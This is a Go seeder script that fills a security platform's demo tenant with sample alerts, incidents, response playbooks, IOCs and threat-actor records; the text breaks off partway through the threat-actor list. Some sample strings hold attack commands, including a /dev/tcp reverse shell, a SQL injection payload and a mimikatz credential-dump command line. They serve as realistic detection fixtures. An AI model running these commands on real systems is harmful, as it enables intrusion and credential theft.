// Demo data seeder — run once against the demo environment to pre-populate
// the XCloak Security Suite demo tenant (id=9999) with realistic data.
//
// Usage:
//
//	cd xcloak-platform/backend && go run ./cmd/seed/demo
package main

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/joho/godotenv"
	"github.com/lib/pq"
)

func env(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func mustExec(db *sql.DB, query string, args ...any) {
	if _, err := db.Exec(query, args...); err != nil {
		log.Fatalf("seed error:\n%s\nargs: %v\nerr: %v", query, args, err)
	}
}

func main() {
	godotenv.Load()

	dsn := fmt.Sprintf(
		"host=%s port=%s user=%s password=%s dbname=%s sslmode=disable",
		env("DB_HOST", "localhost"),
		env("DB_PORT", "5432"),
		env("DB_USER", "xcloak"),
		env("DB_PASSWORD", "xcloak"),
		env("DB_NAME", "xcloak"),
	)
	db, err := sql.Open("postgres", dsn)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()
	if err := db.Ping(); err != nil {
		log.Fatalf("cannot reach database: %v", err)
	}

	log.Println("Seeding demo tenant…")
	seedTenant(db)
	log.Println("Seeding demo agents…")
	agentIDs := seedAgents(db)
	log.Println("Seeding demo alerts…")
	alertIDs := seedAlerts(db, agentIDs)
	log.Println("Seeding demo incidents…")
	incidentIDs := seedIncidents(db, agentIDs)
	log.Println("Seeding demo playbooks…")
	playbookIDs := seedPlaybooks(db, agentIDs, incidentIDs)
	log.Println("Seeding SOAR executions…")
	seedSOARExecutions(db, agentIDs, playbookIDs)
	log.Println("Seeding FIM alerts…")
	seedFIM(db, agentIDs)
	log.Println("Seeding compliance scores…")
	seedCompliance(db)
	log.Println("Seeding endpoint processes…")
	seedProcesses(db, agentIDs)
	log.Println("Seeding IOCs and threat intel…")
	seedIOCs(db)
	log.Println("Seeding threat feeds…")
	seedThreatFeeds(db)
	log.Println("Seeding threat actors…")
	seedThreatActors(db)
	log.Println("Seeding Sigma rules…")
	seedSigmaRules(db)
	log.Println("Seeding YARA rules and matches…")
	seedYaraRules(db, agentIDs)
	log.Println("Seeding firewall rules…")
	seedFirewallRules(db)
	log.Println("Seeding vulnerabilities…")
	seedVulnerabilities(db, agentIDs)
	log.Println("Seeding assets…")
	seedAssets(db, agentIDs)
	log.Println("Seeding cases…")
	seedCases(db, alertIDs, incidentIDs)
	log.Println("Seeding suppression rules…")
	seedSuppressionRules(db)
	log.Println("Seeding quarantine…")
	seedQuarantine(db, agentIDs)
	log.Println("Seeding network anomalies…")
	seedNetworkAnomalies(db, agentIDs)
	log.Println("Seeding UEBA events…")
	seedUEBA(db, agentIDs)
	log.Println("Seeding insider threat scores…")
	seedInsiderThreat(db)
	log.Println("Seeding alert clusters…")
	seedAlertClusters(db, alertIDs)
	log.Println("Seeding JA3 fingerprints…")
	seedJA3(db)
	log.Println("Seeding canary tokens…")
	seedCanary(db, agentIDs)
	log.Println("Seeding hunt templates and runs…")
	seedHunt(db, agentIDs)
	log.Println("Seeding endpoint logs…")
	seedEndpointLogs(db, agentIDs)
	log.Println("Seeding log sources…")
	seedLogSources(db, agentIDs)
	log.Println("Seeding network connections…")
	seedNetworkConnections(db, agentIDs)
	log.Println("Seeding risk posture…")
	seedRiskPosture(db)
	log.Println("Seeding ITDR findings…")
	seedITDR(db, agentIDs)
	log.Println("Seeding DFIR collections…")
	seedDFIR(db, agentIDs, incidentIDs)
	log.Println("Seeding MDM devices…")
	seedMDM(db, agentIDs)
	log.Println("Seeding identity cache…")
	seedIdentity(db)
	log.Println("Seeding correlation rules…")
	seedCorrelation(db)
	log.Println("Seeding honeyports…")
	seedHoneyports(db, agentIDs)
	log.Println("Seeding endpoint users…")
	seedEndpointUsers(db, agentIDs)
	log.Println("Seeding cloud/infra alerts…")
	seedCloudInfraAlerts(db, agentIDs)
	log.Println("Demo seed complete.")
}

func seedTenant(db *sql.DB) {
	mustExec(db, `
		INSERT INTO tenants (id, name, slug, is_active)
		VALUES (9999, 'Demo Corp Security', 'demo-corp', true)
		ON CONFLICT (id) DO UPDATE SET name = EXCLUDED.name, is_active = true
	`)
	mustExec(db, `SELECT setval('tenants_id_seq', (SELECT GREATEST(last_value, 10000) FROM tenants_id_seq))`)
}

func seedAgents(db *sql.DB) []int {
	agents := []struct {
		hostname  string
		os        string
		ip        string
		status    string
		machineID string
	}{
		{"web-prod-01", "linux", "10.0.1.10", "online", "demo-machine-001"},
		{"db-server-02", "linux", "10.0.1.20", "online", "demo-machine-002"},
		{"win-workstation-05", "windows", "10.0.2.55", "online", "demo-machine-003"},
		{"android-mobile-01", "android", "192.168.1.88", "online", "demo-machine-004"},
	}

	var ids []int
	for _, a := range agents {
		var id int
		err := db.QueryRow(`
			INSERT INTO agents (hostname, os, ip_address, status, last_seen, machine_id, token, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,9999)
			ON CONFLICT (machine_id) DO UPDATE
				SET status=EXCLUDED.status, last_seen=EXCLUDED.last_seen, tenant_id=9999
			RETURNING id`,
			a.hostname, a.os, a.ip, a.status,
			time.Now().Add(-2*time.Minute), a.machineID, "demo-tok-"+a.machineID,
		).Scan(&id)
		if err != nil {
			log.Printf("agent %s: %v", a.hostname, err)
			continue
		}
		ids = append(ids, id)
		mustExec(db, `
			INSERT INTO agent_health (agent_id, health_score, health_status, last_heartbeat)
			VALUES ($1,$2,'healthy',$3)
			ON CONFLICT (agent_id) DO UPDATE
				SET health_score=EXCLUDED.health_score, last_heartbeat=EXCLUDED.last_heartbeat`,
			id, 75+len(ids)*5, time.Now().Add(-2*time.Minute),
		)
	}
	return ids
}

func seedAlerts(db *sql.DB, agentIDs []int) []int {
	if len(agentIDs) == 0 {
		return nil
	}
	now := time.Now()
	type alert struct {
		agentIdx  int
		severity  string
		rule      string
		message   string
		tactic    string
		technique string
		mitreName string
		status    string
		minsAgo   int
	}
	alerts := []alert{
		{0, "critical", "C2 Beacon Detected", "Outbound beacon to 185.220.101.47:443 every 60s — matches Cobalt Strike jitter profile", "Command and Control", "T1071.001", "Application Layer Protocol: Web Protocols", "open", 5},
		{0, "high", "Port Scan Detected", "TCP SYN sweep from 10.0.1.10 across 10.0.0.0/24 — 254 hosts in 2 seconds", "Discovery", "T1046", "Network Service Discovery", "open", 12},
		{1, "critical", "SQL Injection Attempt", "Payload in POST /api/users: 1' OR '1'='1 — blocked by WAF rule #442", "Initial Access", "T1190", "Exploit Public-Facing Application", "open", 18},
		{2, "high", "Credential Dump — LSASS", "mimikatz.exe accessed lsass.exe (pid 584) — NTLM hashes extracted", "Credential Access", "T1003.001", "OS Credential Dumping: LSASS Memory", "open", 23},
		{1, "high", "Suspicious Data Exfiltration", "15 MB transferred to 94.102.49.190 via HTTPS — possible exfil", "Exfiltration", "T1048", "Exfiltration Over Alternative Protocol", "investigating", 31},
		{0, "medium", "FIM: /etc/passwd Modified", "/etc/passwd changed — new entry for user svc_backdoor detected", "Persistence", "T1136.001", "Create Account: Local Account", "open", 45},
		{2, "medium", "PowerShell Encoded Command", "Base64 -EncodedCommand detected — execution bypass technique", "Execution", "T1059.001", "Command and Scripting Interpreter: PowerShell", "open", 67},
		{0, "high", "SSH Brute Force", "42 failed auth attempts from 45.33.32.156 in 60 seconds", "Credential Access", "T1110.001", "Brute Force: Password Guessing", "resolved", 90},
		{1, "medium", "Suspicious Cron Job", "New crontab: */5 * * * * /tmp/.hidden/beacon — persistence indicator", "Persistence", "T1053.003", "Scheduled Task/Job: Cron", "open", 102},
		{3, "low", "USB Debugging Enabled", "Android device USB debugging active — elevated attack surface", "Defense Evasion", "T1562", "Impair Defenses", "open", 110},
		{2, "critical", "Ransomware File Pattern", "Mass .encrypted rename — 847 files in 30s on /var/data", "Impact", "T1486", "Data Encrypted for Impact", "investigating", 125},
		{0, "medium", "DNS Tunneling Detected", "Long TXT queries to evil-domain.xyz — matches iodine profile", "Command and Control", "T1071.004", "Application Layer Protocol: DNS", "open", 140},
		{1, "low", "Weak TLS Negotiated", "TLSv1.0 with 203.0.113.42 — deprecated protocol", "Defense Evasion", "T1573", "Encrypted Channel", "open", 155},
		{0, "high", "SUID Binary Modified", "SUID set on /usr/local/bin/custom_helper — priv-esc risk", "Privilege Escalation", "T1548.001", "Abuse Elevation Control: Setuid/Setgid", "open", 168},
		{2, "medium", "Scheduled Task: Persistence", "Task WindowsUpdate_Helper runs cmd.exe at logon", "Persistence", "T1053.005", "Scheduled Task/Job: Scheduled Task", "resolved", 200},
		{1, "low", "Event Log Cleared", "Security log cleared (Event ID 1102) by SYSTEM", "Defense Evasion", "T1070.001", "Indicator Removal: Clear Windows Event Logs", "open", 220},
		{0, "medium", "Reverse Shell Detected", "bash -i >& /dev/tcp/192.168.1.99/4444 executed", "Execution", "T1059.004", "Unix Shell Interpreter", "investigating", 240},
		{3, "low", "Rooting Tool Found", "Magisk socket at /dev/.magisk — device may be rooted", "Defense Evasion", "T1562", "Impair Defenses", "open", 260},
		{1, "high", "Unsigned Kernel Module", "rootkit_helper.ko loaded — system integrity risk", "Persistence", "T1547.006", "Kernel Modules and Extensions", "open", 280},
		{0, "medium", "Impossible Travel Login", "Login from Nigeria — no history of this location for user admin", "Initial Access", "T1078", "Valid Accounts", "resolved", 300},
		{2, "low", "Windows Defender Disabled", "Real-time protection disabled via registry key", "Defense Evasion", "T1562.001", "Disable or Modify Tools", "open", 320},
		{0, "high", "JA3 Fingerprint Match", "JA3=769,47-53-5-10-49171:0-65281:23 matches Metasploit payload", "Command and Control", "T1071", "Application Layer Protocol", "open", 340},
		{1, "medium", "Macro Execution Detected", "cmd.exe spawned by winword.exe — Office macro execution", "Execution", "T1204.002", "User Execution: Malicious File", "open", 360},
		{3, "low", "Unknown App Installed", "com.hacker.spyware installed from unknown source", "Initial Access", "T1476", "Deliver Malicious App", "open", 380},
		{2, "medium", "Pass-the-Hash Attempt", "NTLM hash reuse from 10.0.2.55 to dc-01 — lateral movement", "Lateral Movement", "T1550.002", "Pass the Hash", "investigating", 400},
	}

	var ids []int
	for i, a := range alerts {
		agentID := agentIDs[a.agentIdx%len(agentIDs)]
		fingerprint := fmt.Sprintf("demo-%s-%d", a.technique, i)
		var id int
		err := db.QueryRow(`
			INSERT INTO alerts
				(agent_id, severity, rule_name, log_message, created_at,
				 mitre_tactic, mitre_technique, mitre_name, status, fingerprint, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,9999)
			RETURNING id`,
			agentID, a.severity, a.rule, a.message,
			now.Add(-time.Duration(a.minsAgo)*time.Minute),
			a.tactic, a.technique, a.mitreName, a.status, fingerprint,
		).Scan(&id)
		if err != nil {
			log.Printf("alert %d: %v", i, err)
			continue
		}
		ids = append(ids, id)
	}
	return ids
}

func seedIncidents(db *sql.DB, agentIDs []int) []int {
	if len(agentIDs) == 0 {
		return nil
	}
	now := time.Now()
	incidents := []struct {
		agentIdx    int
		title       string
		severity    string
		status      string
		description string
		aiSummary   string
		minsAgo     int
	}{
		{
			0, "Active C2 Beaconing — Suspected Cobalt Strike Implant", "critical", "investigating",
			"Host web-prod-01 generating HTTPS callbacks to 185.220.101.47 every 60s. eBPF telemetry shows beacon process as renamed sshd binary. FIM confirms /usr/sbin/sshd was replaced 4h ago.",
			"High-confidence C2 implant. Recommend immediate isolation of web-prod-01, memory acquisition, and threat hunt across all hosts. Block 185.220.101.47 at firewall immediately.",
			25,
		},
		{
			2, "Credential Dump + Lateral Movement Chain", "high", "investigating",
			"win-workstation-05 ran mimikatz against LSASS, extracted NTLM hashes, then attempted Pass-the-Hash to dc-01 within 8 minutes. AD logs show 3 successful logins with stolen credential.",
			"Multi-stage attack in progress. Disable affected accounts, force Kerberos ticket invalidation, isolate win-workstation-05 for forensic analysis.",
			120,
		},
		{
			1, "Ransomware Contained — 847 Files Encrypted", "critical", "resolved",
			"db-server-02 detected mass .encrypted rename at 847 files/30s. SOAR playbook isolated host and created DFIR snapshot within 90s. Confirmed BlackCat/ALPHV variant.",
			"Contained. Host isolated in 90s. Restoring from clean backup (2026-07-07 02:00 UTC). Patch CVE-2024-1234 on all Linux hosts to close initial access vector.",
			480,
		},
	}

	var ids []int
	for _, inc := range incidents {
		agentID := agentIDs[inc.agentIdx%len(agentIDs)]
		var id int
		err := db.QueryRow(`
			INSERT INTO incidents
				(agent_id, title, severity, status, description, ai_summary, created_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,9999)
			RETURNING id`,
			agentID, inc.title, inc.severity, inc.status, inc.description, inc.aiSummary,
			now.Add(-time.Duration(inc.minsAgo)*time.Minute),
		).Scan(&id)
		if err != nil {
			log.Printf("incident: %v", err)
			continue
		}
		ids = append(ids, id)
	}
	return ids
}

type pbStep struct {
	stepOrder  int
	actionType string
	payload    string
	condition  string
	stepName   string
}

type prebuiltPB struct {
	name        string
	triggerType string
	actionType  string
	steps       []pbStep
}

func seedPlaybooks(db *sql.DB, agentIDs []int, incidentIDs []int) []int {
	prebuilt := []prebuiltPB{
		// ── 1 ──────────────────────────────────────────────────────────────────
		{
			name: "Ransomware: Full Containment Response", triggerType: "alert_critical", actionType: "isolate_host",
			steps: []pbStep{
				{1, "isolate_host", `{}`, ``, "isolate"},
				{2, "collect_processes", `{}`, ``, "snapshot_procs"},
				{3, "collect_file_hashes", `{}`, ``, "snapshot_hashes"},
				{4, "pagerduty_incident", `{"severity":"critical","component":"endpoint","summary":"Ransomware containment initiated"}`, ``, "page_oncall"},
			},
		},
		// ── 2 ──────────────────────────────────────────────────────────────────
		{
			name: "C2 Beacon: Block and Collect", triggerType: "alert_high", actionType: "collect_connections",
			steps: []pbStep{
				{1, "collect_connections", `{}`, ``, "collect_net"},
				{2, "collect_processes", `{}`, ``, "collect_procs"},
				{3, "webhook", `{"url":"{{SIEM_WEBHOOK}}","method":"POST","body":{"event":"c2_beacon","agent":"{{alert.agent_id}}"}}`, ``, "alert_siem"},
				{4, "slack_message", `{"channel":"#soc-alerts","text":"C2 beacon detected on {{alert.hostname}} — connections collected, review dashboard."}`, ``, "notify_slack"},
			},
		},
		// ── 3 ──────────────────────────────────────────────────────────────────
		{
			name: "YARA Malware Match: Quarantine and DFIR", triggerType: "YARA Match", actionType: "quarantine_file",
			steps: []pbStep{
				{1, "quarantine_file", `{"path":"{{alert.file_path}}"}`, ``, "quarantine"},
				{2, "collect_file_hashes", `{}`, ``, "hash_scan"},
				{3, "collect_processes", `{}`, ``, "proc_snap"},
				{4, "pagerduty_incident", `{"severity":"high","component":"malware","summary":"YARA match quarantine — {{alert.rule_name}}"}`, ``, "page_soc"},
			},
		},
		// ── 4 ──────────────────────────────────────────────────────────────────
		{
			name: "Brute Force: Block and Alert", triggerType: "alert_high", actionType: "webhook",
			steps: []pbStep{
				{1, "webhook", `{"url":"{{FIREWALL_API}}","method":"POST","body":{"action":"block","ip":"{{alert.src_ip}}"}}`, ``, "block_ip"},
				{2, "slack_message", `{"channel":"#soc-alerts","text":"Brute-force source {{alert.src_ip}} blocked via firewall."}`, ``, "notify"},
				{3, "collect_auth_logs", `{}`, ``, "collect_auth"},
			},
		},
		// ── 5 ──────────────────────────────────────────────────────────────────
		{
			name: "Data Exfiltration: Isolate and Notify", triggerType: "alert_critical", actionType: "isolate_host",
			steps: []pbStep{
				{1, "collect_connections", `{}`, ``, "capture_net"},
				{2, "isolate_host", `{}`, ``, "isolate"},
				{3, "email_alert", `{"to":"ciso@company.com","subject":"Exfiltration alert — host isolated","body":"Agent {{alert.hostname}} isolated after exfiltration detection. Review DFIR snapshot."}`, ``, "email_ciso"},
				{4, "pagerduty_incident", `{"severity":"critical","component":"data-loss","summary":"Potential exfiltration — host isolated"}`, ``, "page_oncall"},
			},
		},
		// ── 6 ──────────────────────────────────────────────────────────────────
		{
			name: "IOC Match: Enrich and Block", triggerType: "IOC Match", actionType: "webhook",
			steps: []pbStep{
				{1, "collect_connections", `{}`, ``, "capture"},
				{2, "webhook", `{"url":"{{FIREWALL_API}}","method":"POST","body":{"action":"block","ip":"{{alert.ioc_value}}"}}`, ``, "block"},
				{3, "slack_message", `{"channel":"#threat-intel","text":"IOC match on {{alert.hostname}}: {{alert.ioc_value}} blocked."}`, ``, "notify"},
			},
		},
		// ── 7 ──────────────────────────────────────────────────────────────────
		{
			name: "Privilege Escalation: Collect and Page", triggerType: "alert_high", actionType: "collect_processes",
			steps: []pbStep{
				{1, "collect_processes", `{}`, ``, "proc_snap"},
				{2, "collect_users", `{}`, ``, "user_snap"},
				{3, "collect_auth_logs", `{}`, ``, "auth_snap"},
				{4, "pagerduty_incident", `{"severity":"high","component":"identity","summary":"Privilege escalation detected — {{alert.hostname}}"}`, ``, "page"},
			},
		},
		// ── 8 ──────────────────────────────────────────────────────────────────
		{
			name: "Lateral Movement: Isolate Source Host", triggerType: "alert_critical", actionType: "isolate_host",
			steps: []pbStep{
				{1, "collect_connections", `{}`, ``, "net_snap"},
				{2, "collect_processes", `{}`, ``, "proc_snap"},
				{3, "isolate_host", `{}`, `severity == "critical"`, "isolate"},
				{4, "slack_message", `{"channel":"#soc-critical","text":"Lateral movement on {{alert.hostname}} — host isolated. Connections captured."}`, ``, "notify"},
			},
		},
		// ── 9 ──────────────────────────────────────────────────────────────────
		{
			name: "Port Scan: Firewall Block and Log", triggerType: "alert_medium", actionType: "webhook",
			steps: []pbStep{
				{1, "collect_connections", `{}`, ``, "capture_net"},
				{2, "webhook", `{"url":"{{FIREWALL_API}}","method":"POST","body":{"action":"rate_limit","ip":"{{alert.src_ip}}"}}`, ``, "rate_limit"},
				{3, "slack_message", `{"channel":"#soc-alerts","text":"Port scan from {{alert.src_ip}} — rate-limited at firewall."}`, ``, "notify"},
			},
		},
		// ── 10 ─────────────────────────────────────────────────────────────────
		{
			name: "Insider Threat: Snapshot and Escalate", triggerType: "alert_high", actionType: "collect_processes",
			steps: []pbStep{
				{1, "collect_processes", `{}`, ``, "proc_snap"},
				{2, "collect_connections", `{}`, ``, "net_snap"},
				{3, "collect_auth_logs", `{}`, ``, "auth_snap"},
				{4, "email_alert", `{"to":"hr-security@company.com","subject":"Insider threat alert","body":"User activity on {{alert.hostname}} flagged. Evidence collected. Review case."}`, ``, "email_hr"},
			},
		},
		// ── 11 ─────────────────────────────────────────────────────────────────
		{
			name: "Phishing Response: Quarantine and Notify", triggerType: "alert_medium", actionType: "quarantine_file",
			steps: []pbStep{
				{1, "quarantine_file", `{"path":"{{alert.file_path}}"}`, ``, "quarantine"},
				{2, "email_alert", `{"to":"security@company.com","subject":"Phishing attachment quarantined","body":"File quarantined on {{alert.hostname}}. User notified."}`, ``, "notify_user"},
				{3, "slack_message", `{"channel":"#soc-alerts","text":"Phishing file quarantined on {{alert.hostname}} — rule: {{alert.rule_name}}"}`, ``, "notify_soc"},
			},
		},
		// ── 12 ─────────────────────────────────────────────────────────────────
		{
			name: "Supply Chain: Full Audit Snapshot", triggerType: "alert_critical", actionType: "collect_packages",
			steps: []pbStep{
				{1, "collect_packages", `{}`, ``, "pkg_snap"},
				{2, "collect_file_hashes", `{}`, ``, "hash_snap"},
				{3, "collect_processes", `{}`, ``, "proc_snap"},
				{4, "pagerduty_incident", `{"severity":"critical","component":"supply-chain","summary":"Supply chain compromise suspected on {{alert.hostname}}"}`, ``, "page"},
			},
		},
		// ── 13 ─────────────────────────────────────────────────────────────────
		{
			name: "Critical Incident: Auto-DFIR Collection", triggerType: "incident_created", actionType: "collect_processes",
			steps: []pbStep{
				{1, "collect_processes", `{}`, ``, "proc_snap"},
				{2, "collect_connections", `{}`, ``, "net_snap"},
				{3, "collect_file_hashes", `{}`, ``, "hash_snap"},
				{4, "collect_auth_logs", `{}`, ``, "auth_snap"},
				{5, "slack_message", `{"channel":"#soc-incidents","text":"Auto-DFIR snapshot collected for new incident #{{incident.id}} on {{alert.hostname}}."}`, ``, "notify"},
			},
		},
		// ── 14 ─────────────────────────────────────────────────────────────────
		{
			name: "Zero-Day Exploit: Emergency Isolation", triggerType: "alert_critical", actionType: "isolate_host",
			steps: []pbStep{
				{1, "isolate_host", `{}`, ``, "isolate"},
				{2, "collect_processes", `{}`, ``, "proc_snap"},
				{3, "collect_connections", `{}`, ``, "net_snap"},
				{4, "collect_file_hashes", `{}`, ``, "hash_snap"},
				{5, "pagerduty_incident", `{"severity":"critical","component":"zero-day","summary":"Zero-day exploit suspected — {{alert.hostname}} isolated for emergency DFIR"}`, ``, "page_ciso"},
				{6, "email_alert", `{"to":"ciso@company.com","subject":"[CRITICAL] Zero-day response initiated","body":"Host {{alert.hostname}} isolated. DFIR snapshot underway. Playbook executed automatically."}`, ``, "email_ciso"},
			},
		},
	}

	var pbIDs []int
	for _, p := range prebuilt {
		var id int
		err := db.QueryRow(`
			INSERT INTO playbooks (name, trigger_type, action_type, enabled, tenant_id)
			VALUES ($1,$2,$3,true,9999)
			RETURNING id`,
			p.name, p.triggerType, p.actionType,
		).Scan(&id)
		if err != nil {
			log.Printf("playbook insert: %v", err)
			continue
		}
		pbIDs = append(pbIDs, id)

		// Seed multi-step actions for this playbook
		for _, s := range p.steps {
			payload := s.payload
			if payload == "" {
				payload = "{}"
			}
			_, aerr := db.Exec(`
				INSERT INTO playbook_actions
					(playbook_id, step_order, action_type, payload, condition_expr,
					 max_retries, retry_delay_secs, timeout_seconds, run_parallel,
					 step_name, tenant_id)
				VALUES ($1,$2,$3,$4::jsonb,$5,0,5,60,false,$6,9999)`,
				id, s.stepOrder, s.actionType, payload, s.condition, s.stepName,
			)
			if aerr != nil {
				log.Printf("playbook action (pb %d step %d): %v", id, s.stepOrder, aerr)
			}
		}
	}

	// Seed pending-approval executions so SOAR queue has visible items
	if len(pbIDs) >= 3 && len(agentIDs) >= 2 {
		mustExec(db, `
			INSERT INTO playbook_executions
				(playbook_id, agent_id, action_type, status, created_at, tenant_id)
			VALUES ($1,$2,'isolate_host','pending_approval',$3,9999)`,
			pbIDs[0], agentIDs[0], time.Now().Add(-10*time.Minute),
		)
		mustExec(db, `
			INSERT INTO playbook_executions
				(playbook_id, agent_id, action_type, status, created_at, tenant_id)
			VALUES ($1,$2,'quarantine_file','pending_approval',$3,9999)`,
			pbIDs[2], agentIDs[1], time.Now().Add(-5*time.Minute),
		)
		mustExec(db, `
			INSERT INTO playbook_executions
				(playbook_id, agent_id, action_type, status, created_at, tenant_id)
			VALUES ($1,$2,'isolate_host','pending_approval',$3,9999)`,
			pbIDs[7], agentIDs[0], time.Now().Add(-2*time.Minute),
		)
	}
	return pbIDs
}

func seedFIM(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	type change struct {
		agentIdx   int
		path       string
		changeType string
		oldHash    string
		newHash    string
		minsAgo    int
	}
	changes := []change{
		{0, "/etc/passwd", "modified", "a1b2c3d4e5f6", "f6e5d4c3b2a1", 45},
		{0, "/usr/sbin/sshd", "modified", "deadbeef1234", "cafebabe5678", 240},
		{0, "/etc/crontab", "modified", "11223344aabb", "aabb11223344", 102},
		{1, "/etc/sudoers", "modified", "99887766ffee", "ffeeff998877", 180},
		{1, "/var/spool/cron/root", "created", "", "123abc456def", 102},
		{2, "C:\\Windows\\System32\\cmd.exe", "modified", "abcdef123456", "654321fedcba", 320},
		{2, "C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.bat", "created", "", "aabbccdd1122", 200},
	}
	for _, ch := range changes {
		agentID := agentIDs[ch.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO fim_alerts
				(agent_id, file_path, change_type, old_hash, new_hash, created_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,9999)`,
			agentID, ch.path, ch.changeType, ch.oldHash, ch.newHash,
			now.Add(-time.Duration(ch.minsAgo)*time.Minute),
		)
	}
}

func seedCompliance(db *sql.DB) {
	// compliance_scores requires a parent compliance_reports row
	var reportID int
	err := db.QueryRow(`
		INSERT INTO compliance_reports
			(title, report_type, generated_by, summary, created_at, tenant_id)
		VALUES ('Demo Environment Baseline','automated','demo-seeder','{}',now(),9999)
		RETURNING id`,
	).Scan(&reportID)
	if err != nil {
		log.Printf("compliance_reports: %v", err)
		return
	}

	frameworks := []struct {
		framework string
		score     int
		passed    int
		failed    int
	}{
		{"CIS", 72, 144, 56},
		{"NIST_CSF", 68, 68, 32},
		{"PCI_DSS", 81, 97, 23},
	}
	for _, f := range frameworks {
		mustExec(db, `
			INSERT INTO compliance_scores
				(report_id, framework, score, passed, failed, computed_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,now(),9999)`,
			reportID, f.framework, f.score, f.passed, f.failed,
		)
	}
}

func seedProcesses(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	type proc struct {
		agentIdx int
		pid      int
		name     string
		cmdline  string
		user     string
		cpu      string
		mem      string
	}
	procs := []proc{
		{0, 1, "systemd", "/sbin/init", "root", "0.1", "0.3"},
		{0, 1234, "nginx", "nginx: master process /usr/sbin/nginx", "www-data", "0.3", "1.2"},
		{0, 5820, "sshd", "/usr/sbin/sshd -D", "root", "99.2", "0.2"},
		{0, 6001, "python3", "python3 /tmp/.hidden/c2client.py", "root", "1.2", "0.6"},
		{1, 1, "systemd", "/sbin/init", "root", "0.1", "0.3"},
		{1, 3310, "mysqld", "/usr/sbin/mysqld --daemonize", "mysql", "4.5", "18.2"},
		{1, 4521, "bash", "bash /tmp/.hidden/beacon", "www-data", "0.8", "0.1"},
		{2, 4, "System", "", "SYSTEM", "0.2", "0.1"},
		{2, 584, "lsass.exe", "C:\\Windows\\System32\\lsass.exe", "SYSTEM", "0.5", "0.8"},
		{2, 8832, "mimikatz.exe", "mimikatz.exe privilege::debug sekurlsa::logonpasswords", "Administrator", "45.3", "0.3"},
		{2, 9100, "powershell.exe", "powershell.exe -EncodedCommand SQBFAFgA...", "User", "2.1", "1.2"},
	}
	for _, p := range procs {
		agentID := agentIDs[p.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO endpoint_processes
				(agent_id, pid, process_name, cmdline, username, cpu_percent, mem_percent, collected_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,9999)`,
			agentID, p.pid, p.name, p.cmdline, p.user, p.cpu, p.mem, now,
		)
	}
}

func seedIOCs(db *sql.DB) {
	iocs := []struct {
		indicator, iocType, severity, desc, source string
	}{
		{"185.220.101.47", "ip", "critical", "Known Cobalt Strike C2 IP — Tor exit relay used in multiple campaigns", "mandiant"},
		{"94.102.49.190", "ip", "high", "Exfiltration staging server — associated with APT28", "misp"},
		{"45.33.32.156", "ip", "high", "SSH brute force source — scanners.io botnet node", "abuseipdb"},
		{"evil-domain.xyz", "domain", "high", "DNS tunneling C2 domain — iodine profile match", "internal"},
		{"203.0.113.42", "ip", "medium", "TLS 1.0 downgrade proxy — outdated cipher negotiation observed", "internal"},
		{"d41d8cd98f00b204e9800998ecf8427e", "md5", "critical", "Empty file hash used as YARA evasion marker", "virustotal"},
		{"44d88612fea8a8f36de82e1278abb02f", "md5", "high", "Mimikatz binary hash — sekurlsa module variant", "virustotal"},
		{"275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", "sha256", "critical", "BlackCat/ALPHV ransomware encryptor — July 2026 campaign", "cisa"},
		{"com.hacker.spyware", "package", "high", "Android spyware package — data exfiltration capabilities", "internal"},
		{"rootkit_helper.ko", "filename", "critical", "Unsigned kernel module — rootkit loader", "internal"},
		{"/tmp/.hidden/beacon", "path", "high", "Beacon binary path — C2 dropper staging location", "internal"},
		{"beacon.cobaltrike.net", "domain", "critical", "Cobalt Strike team server domain", "threatfox"},
		{"SQBFAFgA", "string", "medium", "PowerShell base64 encoded payload prefix", "internal"},
	}
	for _, ioc := range iocs {
		mustExec(db, `
			INSERT INTO iocs (indicator, type, severity, description, source, enabled, tenant_id)
			VALUES ($1,$2,$3,$4,$5,true,9999)
			ON CONFLICT DO NOTHING`,
			ioc.indicator, ioc.iocType, ioc.severity, ioc.desc, ioc.source,
		)
	}
}

func seedThreatFeeds(db *sql.DB) {
	feeds := []struct {
		name, source, feedType, format string
		iocCount                        int
	}{
		{"Emerging Threats", "https://rules.emergingthreats.net/blockrules/compromised-ips.txt", "flatfile", "plaintext", 48231},
		{"CISA KEV", "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json", "flatfile", "json", 1112},
		{"ThreatFox IOCs", "https://threatfox-api.abuse.ch/api/v1/", "api", "json", 82450},
		{"AbuseIPDB", "https://api.abuseipdb.com/api/v2/blacklist", "api", "json", 15820},
		{"MISP Community Feed", "https://www.circl.lu/doc/misp/feed-osint/", "taxii", "json", 34102},
	}
	for _, f := range feeds {
		mustExec(db, `
			INSERT INTO threat_feeds (name, source, feed_type, format, enabled, ioc_count, last_sync, tenant_id)
			VALUES ($1,$2,$3,$4,true,$5,now()-interval '2 hours',9999)
			ON CONFLICT DO NOTHING`,
			f.name, f.source, f.feedType, f.format, f.iocCount,
		)
	}
}

func seedThreatActors(db *sql.DB) {
	actors := []struct {
		name, country, motivation, sophistication, desc string
		aliases, sectors, techniques                    []string
	}{
		{
			"APT28", "Russia", "espionage", "nation-state",
			"Russian GRU-affiliated threat actor known for targeting government, military, and media organizations worldwide.",
			[]string{"Fancy Bear", "Sofacy", "STRONTIUM"},
			[]string{"government", "military", "media", "aerospace"},
			[]string{"T1071.001", "T1059.001", "T1078", "T1027"},
		},
		{
			"Lazarus Group", "North Korea", "financial", "nation-state",
			"North Korean APT responsible for cryptocurrency theft and ransomware campaigns. Linked to WannaCry.",
			[]string{"Hidden Cobra", "ZINC", "Whois Team"},
			[]string{"financial", "cryptocurrency", "defense"},
